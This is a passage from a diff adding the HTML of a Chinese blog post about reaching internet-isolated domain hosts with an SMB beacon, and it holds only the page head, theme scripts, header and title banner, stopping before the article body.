@@ -1,0 +1,2769 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Drunkmars">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Drunkmars">
+    
+        <meta name="keywords" content="Drunkmars,Drunkmars-theme,Drunkmars-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="本文首发于先知社区：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9607 之前在打一个域环境的时候出现了域内主机不出网的情况，当时用的是cs的socks代理将不出网主机的流量代理到了边缘主机上。当时没有考虑太多，下来之后想到搭一个环境复现一下当时的情况，看有没有更简便的方法能够打下不出网的主机。 机缘巧合之下，发现了这个域环境还不错，再复现的过程中也有一些知识触及了我的知识盲区，也收获了许多新">
+<meta property="og:type" content="article">
+<meta property="og:title" content="巧用smb beacon拿下不出网主机">
+<meta property="og:url" content="http://example.com/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/index.html">
+<meta property="og:site_name" content="Drunkmars">
+<meta property="og:description" content="本文首发于先知社区：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9607 之前在打一个域环境的时候出现了域内主机不出网的情况，当时用的是cs的socks代理将不出网主机的流量代理到了边缘主机上。当时没有考虑太多，下来之后想到搭一个环境复现一下当时的情况，看有没有更简便的方法能够打下不出网的主机。 机缘巧合之下，发现了这个域环境还不错，再复现的过程中也有一些知识触及了我的知识盲区，也收获了许多新">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/f17be4de19b9fa719433c19cb52a5a12.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/0d2189a3256020e2a81fb289bd191dff.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/fda8b4b8aa584195ef706c94eaa14376.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/050e0873eaa32a73e648afe08cb94fe7.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/ea1e93134bc57be9b4b7116bd51d1601.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/b9b481a9f82c2c6f1f1b88c7bd9bc940.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/78edc9b49984352e76d5718a21948a69.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/08fceb9032b60c6b0424692956db4d1d.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/848143be6cd6d0f85c1d4fa7824df9a5.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/29e759a86eba3eb4e5fd0dcb97d390c4.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/bf7f769d6cf6b45847ebd4898e56a40f.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/2f8df1d915ed636ad9ee88964fa62ba7.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/ce75b493d073b2f5e6343d391f86ff7e.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/998bf4b14987695087cbf7bd8d862dae.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/55134922bb3dd7ed9aa0140d328296d4.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/06a53e1cbff3d9034fa2a40ebd025848.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/4b2497c8ad7c730eff4e6a38664d157e.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/1819fa0ba9110af7c8880853c8b7e7cf.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/d98c77221bb750a3fefd80397e55fe21.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3c6a0234f3cbc4ceb43cc25b80c4bb42.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/34d2ed6c98ca726abe226690b730a1e4.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/965ce35b9a81025a47c91c9fbd879137.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/9040f0d28dc26accaf55a26fadfc3319.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8f5cac2cd879b433b88e9c031f218076.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3b9999546a7c8c0d9430323c9a6cc6c9.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/2051070b0a189819c79a4bea8d7eed66.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/533da861b46328357a8eff80abbe4d56.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/57185cf29565d4e3db9a81713fc1d3e3.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8f389225e67702e65f47098b2b200bcd.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/a82a054771b8b76dec1d49a7c032903c.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8f1f0472e1fd9b3249d1df5ce289a5e0.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/c61e8926c8d5dab6d75eddebaf44b665.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/4e7ab40bd84f6ca1cf6e30703a5164f9.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/0bdb70b932b4c4f1f3a34490d8e8b1dd.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/04c2979abf7d708ec3a90297c9e230cd.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/e493469a9757b742a1e900741be69cdc.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/01cfa57adcc4b46d314748bd96cc0d91.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8ffdeb7821bf0dc7d7f20e2cf6ce155f.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/4e6aaebb778bf469c7cda9d2a75f4573.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/e70147039d0e21e53ceb0263eca9310c.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/b745ff17f3cef57d7b6675846dc0c9b9.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8172a2b118e6070fac274eea8020e3c1.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/1d56ae45710cf87894d6e63aa7600153.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/7cd34a91bdd9527bdb4e4d7739af66cd.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3ffc5c89e8424cd2404885223fb90bef.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/6806bdafdc0ee3187c28a2e2088ba908.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/169053dd7f7232c60511d29f299d2a6d.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/b84bcae5626da1bda9761e84f1019c9a.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/d153d5565524a78ce0478f24271398e3.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/d61149218a4763bb4585f67ab83b036d.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3d25039447220e696f47fc6dd0d0139b.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/e57e7ab24e82eeb1b218469e2b92c3cd.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/7192a2f3422701078eb37365d618f808.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/f636367b3dbf47f5e4e5ae4465fa668b.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/fa148c938f9597b17ca0482f2138c512.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/00551d435277c5686e5806c45ce828ca.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/6c5b9923c07a2d578523c3da9c23c232.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/9e4e851d41f0373741bac9e00935588f.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/39236effd43eca613a888f372982ca81.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8687663e07fa6c7aa51ea82e9b191188.png">
+<meta property="og:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/2765c77363b9b11054fbcdba3db07cac.png">
+<meta property="article:published_time" content="2021-04-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-11T11:11:21.925Z">
+<meta property="article:author" content="Drunkmars">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/f17be4de19b9fa719433c19cb52a5a12.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>巧用smb beacon拿下不出网主机 · Drunkmars&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Drunkmars's Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Drunkmars&#39;s Blog</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">巧用smb beacon拿下不出网主机</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                巧用smb beacon拿下不出网主机
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="内网渗透">内网渗透</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.1k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/09</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
